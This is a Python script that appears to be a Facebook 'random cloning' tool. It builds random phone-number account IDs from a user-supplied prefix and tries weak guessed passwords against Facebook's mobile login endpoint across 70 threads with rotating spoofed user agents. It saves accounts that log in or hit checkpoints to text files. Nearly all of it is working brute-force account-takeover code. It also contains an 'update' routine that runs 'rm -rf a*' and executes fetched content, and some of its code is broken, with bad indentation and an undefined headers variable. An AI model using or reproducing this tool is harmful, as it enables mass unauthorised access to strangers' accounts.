#coding=utf
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

ugen2=[]
ugen=[]

for xd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36;]'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

logo=("""
 ########::'####:'##::::::::::'###::::'##:::::::
 ##.... ##:. ##:: ##:::::::::'## ##::: ##:::::::
 ##:::: ##:: ##:: ##::::::::'##:. ##:: ##:::::::
 ########::: ##:: ##:::::::'##:::. ##: ##:::::::
 ##.... ##:: ##:: ##::::::: #########: ##:::::::
 ##:::: ##:: ##:: ##::::::: ##.... ##: ##:::::::
 ########::'####: ########: ##:::: ##: ########:
........:::....::........::..:::::..::........::
\33[1;92m----------------------------------------------
→   Owner      :  MUHAMMAD BILAL AHMDANI
→   Facebook   :  MUHAMMAD BILAL
→   Github     :  PRIVET
→   Tool Type  :  \x1b[1;92mRNDM CLONING
\x1b[1;92m→   Version    :  0.0.1
\33[1;92m----------------------------------------------""")

def lines():
	print('\33[1;92m----------------------------------------------')
loop = 0
oks = []
cps = []
try:
    print('\n Updating...\n\033[1;37m Please Wait\033[0;97m\n Update Don Bro ')
    proxy = requests.get('https://www.facebook.com/MUH4MM4D.B1L4L.4HMD4N1.DG.KHAN').text.splitlines()
    v = 3.1
    update = requests.get('https://www.facebook.com/MUH4MM4D.B1L4L.4HMD4N1.DG.KHAN').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://www.facebook.com/MUH4MM4D.B1L4L.4HMD4N1.DG.KHAN')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def riaz():
	os.system('clear')
	print(logo)
	print('[1] Pak Random Cloning menu')
	print('[2] Bangladish Random Cloning')
	print('[3] Create File dumping')
	print('[4] Follow me on Facebook')
	print('\x1b[1;91m[5] Exit Main menu')
	print('\33[1;37m----------------------------------------------')
	riaz1 = input('[•] Select option  : ')
	if riaz1 =='1':
		annu()
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/MUH4MM4D.B1L4L.4HMD4N1.DG.KHAN')
	if riaz1 =='4':
		os.system('xdg-open https://www.facebook.com/MUH4MM4D.B1L4L.4HMD4N1.DG.KHAN');riaz()
	if riaz1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		riaz()

def annu():
    os.system('clear')
    print(logo)
    print('[1] Random Method \x1b[1;92m1')
    print('\x1b[1;97m[2] Random Method \x1b[1;92m2')
    print('\x1b[1;97m[3] Random Method \x1b[1;92m3')
    print('\x1b[1;91m[4] Go to main menu')
    lines()
    riaz1 = input('[+] CHOOSE optION : ')
    if riaz1 =='1':
    	m1()
    if riaz1 =='2':
    	m2()
    if riaz1 =='3':
    	m3()
    if riaz1 =='4':
    	riaz()
    else:
        print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')        
#
def bangla():
	os.system('clear')
	print(logo)
	print('[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;97m[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;91m[3] Go to main menu')
	lines()
	riaz1 = input('[+] Select option : ')
	if riaz1 =='1':
		b1()
	if riaz1 =='2':
		b2()
	if riaz1 =='3':
		riaz()
#def choice()
#

def m1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def m2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khankhan','khan12345','khan12']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def m3():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'100200','100200','500100','khan123']
            yaari.submit(rcrack,uid,pwx,tl)

    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
#
def b1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88**,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode]
            yaari.submit(rcrack,uid,pwx,tl)
 
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def b2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88***,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'freefire','bangladish','free fire']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()

#
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {
    'authority': 'p.facebook.com',
    'method': 'POST',
    'scheme': 'https',
    'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=X7DxYy13c8TJihIQ7XiH7xrE; sb=X7DxYzs3FMLvQoAkYuyWVjFn; m_pixel_ratio=2.75; dnonce=AWmCQAPCtxEFBOcsdUucnfRmQ3t4RJwdQJmfYyrS0-k2NtfiTBMJo-3E3vPXdh8C2SJV-jOqbgd3tHK42p6-tMzs; wd=393x732; fr=0JcH6U2KwW5VVGd15..Bj8bBf.7c.AAA.0.0.Bj8bDI.AWVKwodvj9Q',
    'origin': 'https://p.facebook.com',
    'referer': 'https://p.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVoWT2_gG8Y',
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',
}
    lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[BILAL-OK] '+cid+'|'+ps+'\033[0;97m')
                open('BILAL-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[BILAL-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('BILAL-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mBILAL\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

riaz()
